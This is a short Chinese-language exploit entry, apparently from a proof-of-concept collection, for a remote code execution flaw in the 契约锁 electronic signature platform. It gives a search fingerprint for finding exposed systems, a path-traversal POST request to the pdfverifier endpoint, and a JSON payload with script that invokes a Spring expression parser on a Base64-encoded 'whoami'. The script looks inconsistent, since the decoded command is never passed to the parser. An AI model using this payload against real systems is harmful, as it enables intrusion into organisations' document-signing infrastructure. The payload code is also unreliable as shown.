# 契约锁电子签章系统pdfverifier存在远程代码执行漏洞

契约锁电子签章系统 ｜ 命令执行 ｜ —
- **指纹**：`app="契约锁-电子签署平台"`
- **请求**：`POST /pdfverifier/%2e%2e/template/html/add HTTP/1.1`

**Payload**
```
{"file":"1","title":"2","params":{"extensionParam":"{\"expression\":\"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='d2hvYW1p';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a['parseExpression'];c.getValue();\"}","name":"test"}}
```
- **响应特征**：200